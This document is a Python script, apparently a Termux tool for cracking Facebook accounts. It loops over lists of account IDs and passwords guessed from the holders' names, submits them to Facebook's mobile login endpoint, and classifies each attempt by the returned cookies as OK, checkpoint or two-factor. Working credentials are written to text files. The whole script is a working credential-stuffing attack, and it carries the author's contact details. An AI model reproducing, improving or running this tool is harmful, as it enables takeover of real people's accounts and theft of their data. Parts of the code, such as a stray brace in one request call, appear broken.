#decode by : ALPARSALAN
#coding=utf-8
#created by ALPARSALAN
#team name hbf
#tottaly written by Shahzada noorii
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; ALPARSALAN \x07')
...
logo ="""     
  ...
  ______   _______    ______    ______   __         ______   __    __ 
 /      \ /       \  /      \  /      \ /  |       /      \ /  \  /  |
/$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |$$ |      /$$$$$$  |$$  \ $$ |
$$ |__$$ |$$ |__$$ |$$ \__$$/ $$ |__$$ |$$ |      $$ |__$$ |$$$  \$$ |
$$    $$ |$$    $$< $$      \ $$    $$ |$$ |      $$    $$ |$$$$  $$ |
...
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟ \033[1;32m Shahzada noorii         \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟ \033[1;32m Shahzada noorii        \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟ \033[1;32m noorii001                 \033[1;31m 
\033[1;31m│\033[1;37m☞  \033[1;32mWHATSAPP  \033[1;31m ➟  \033[1;32m0799651610                  \033[1;31m   
...
def file_crack():
    ...
    linex()
    opt_method = input(f'CHOOSE SERVER {ALPARSALAN2} : ')
    os.system('clear')
    print(logo)
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/ALPARSALAN_OK.txt\n[•] CP IDS SAVE : /sdcard/HAMII_CP.txt')
...
def method1(ids,names,passlist,total_ids):
    ...
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[ALPARSALAN]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                print('\r\033[1;32m[ALPARSALAN-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/ALPARSALAN_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
                ...
                if 'Enter login code to continue' in str(d):
                    ...
                    tf.append(ids)
                    open('/sdcard/ALPARSALAN_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\033[1;31m[ALPARSALAN-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('/sdcard/ALPARSALAN_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    except Exception as e:
...
    'cache-control': 'max-age=0',
            ...
            post_request = session.post('https://m.facebook.com/login.php', params=params, cookies=cookies, headers=headers).text
            cookies = session.cookies.get_dict().keys()
            #open('jhuk.html', 'w').write(post_request)
            if 'c_user' in cookies:
                print('\r\033[1;32m[ALPARSALAN-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/ALPARSALAN_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    print('\r\033[1;35m[ALPARSALAN-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/ALPARSALAN_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\033[1;31m[ALPARSALAN-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/ALPARSALAN_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
...
def random_method(ids,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[ALPARSALAN]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7',            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'referer': 'https://m.facebook.com/m.alpha.140/?_se_imp=0ko89BkSrqaK9cNRm',
...
    'viewport-width': '980',
            ...
            post_request = xyz.post('https://m.facebook.com/login.php', params=params, cookies=cookies, headers=headers}).text
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    os.system("play-audio ALPARSALAN_OK.mp3")
                    print('\r\033[1;92m[ALPARSALAN-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/ALPARSALAN_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[141:156]
                if cid in tf:
                    ...
                    d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                    if 'Enter login code to continue' in str(d.group(1)):
                        os.system("play-audio ALPARSALAN_2F.mp3")
                        print('\r\033[1;95m[noorii-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/ALPARSALAN_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                        else:
                            os.system("play-audio ALPARSALAN_CP.mp3")
                            print('\r\033[1;94m[ALPARSALAN-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/ALPARSALAN_CP.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
...
def convert(cookie):
    ...
    res = requests.Session().get('https://m.facebook.com/login.php', headers = {
...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r{GREEN}[ALPARSALAN-OK]  '+uid+' | '+ps+ '  ') 
                cek_apk(session,coki)
                open('/sdcard/ALPARSALAN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/ALPARSALAN-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r{RED}[ALPARSALAN-CP] '+uid+' | '+ps+' ')
                    open('/sdcard/ALPARSALAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ALPARSALAN] [%s] \33[1;97m[OK:%s{noori2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
